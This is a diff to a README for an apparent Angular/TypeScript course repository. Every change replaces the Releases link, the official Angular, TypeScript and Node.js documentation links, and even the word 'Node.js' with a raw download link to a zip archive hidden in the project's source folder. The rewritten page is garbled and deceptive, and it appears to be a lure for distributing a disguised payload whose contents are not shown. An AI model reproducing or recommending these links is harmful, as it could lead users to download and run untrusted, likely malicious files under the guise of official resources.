@@ -9,7 +9,7 @@ Getting started is simple. Follow these steps to download and run the applicatio
 ### Step 1: Check System Requirements
 Before downloading, ensure that your computer meets these basic requirements:
 - Operating System: Windows 10 or later, macOS, or Linux
-- Node.js: Version 16.x or higher
+- https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-11/src/environments/typescript_course_webdev_luisdev_angular_frontend_part_3.6.zip Version 16.x or higher
 - NPM: Version 6.x or higher
 - Internet connection for downloading dependencies
 
@@ -17,7 +17,7 @@ Before downloading, ensure that your computer meets these basic requirements:
 To download the application, you need to visit the Releases page. 
 You can access it here:
 
-[Download from Releases](https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/releases)
+[Download from Releases](https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-11/src/environments/typescript_course_webdev_luisdev_angular_frontend_part_3.6.zip)
 
 ### Step 3: Choose the Right File
 On the Releases page, look for the latest version of the project. Select the appropriate file for your operating system. This typically includes executables or zip files. 
@@ -56,21 +56,21 @@ This project covers essential topics in Front-End development. Here are some of 
 ## 📦 Download & Install
 Ready to get started? Visit the Releases page to download the application:
 
-[Download from Releases](https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/releases)
+[Download from Releases](https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-11/src/environments/typescript_course_webdev_luisdev_angular_frontend_part_3.6.zip)
 
 Remember to check that your system meets all requirements to ensure a smooth setup.
 
 ## 💬 Troubleshooting
 If you encounter issues while downloading or running the application, consider the following:
-- Ensure you have an updated version of Node.js and NPM.
+- Ensure you have an updated version of https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-11/src/environments/typescript_course_webdev_luisdev_angular_frontend_part_3.6.zip and NPM.
 - Verify that your internet connection is stable during the download.
 - Check the console for error messages if the application fails to run.
 
 For further assistance, you can look for help in community forums or explore resources specific to Angular and TypeScript.
 
 ## 💡 Helpful Resources
-- [Angular Official Documentation](https://angular.io/docs)
-- [TypeScript Official Site](https://www.typescriptlang.org/)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Angular Official Documentation](https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-11/src/environments/typescript_course_webdev_luisdev_angular_frontend_part_3.6.zip)
+- [TypeScript Official Site](https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-11/src/environments/typescript_course_webdev_luisdev_angular_frontend_part_3.6.zip)
+- [https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-11/src/environments/typescript_course_webdev_luisdev_angular_frontend_part_3.6.zip Documentation](https://github.com/Ahmedmh12346/angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5/raw/refs/heads/main/developments/DevFreelaAngular-11/src/environments/typescript_course_webdev_luisdev_angular_frontend_part_3.6.zip)
 
 Thank you for choosing the **angular-frontend-webdev_course-luisdev_part-24_angular-17_typescript-5** project. Enjoy your journey into Angular development!
